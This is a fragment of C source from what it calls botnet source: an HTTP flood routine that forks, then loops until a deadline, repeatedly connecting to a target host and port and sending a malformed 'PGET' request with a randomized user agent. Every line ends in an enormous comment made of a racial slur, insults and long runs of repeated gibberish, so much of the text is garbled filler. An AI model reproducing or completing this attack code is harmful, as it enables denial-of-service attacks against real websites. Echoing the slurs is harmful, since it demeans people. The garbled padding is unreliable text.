        sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 2)]);//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
        if (fork()) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
            while (end > time(NULL)) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                socket = socket_connect(host, port);//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                if (socket != 0) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                    write(socket, request, strlen(request));//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUO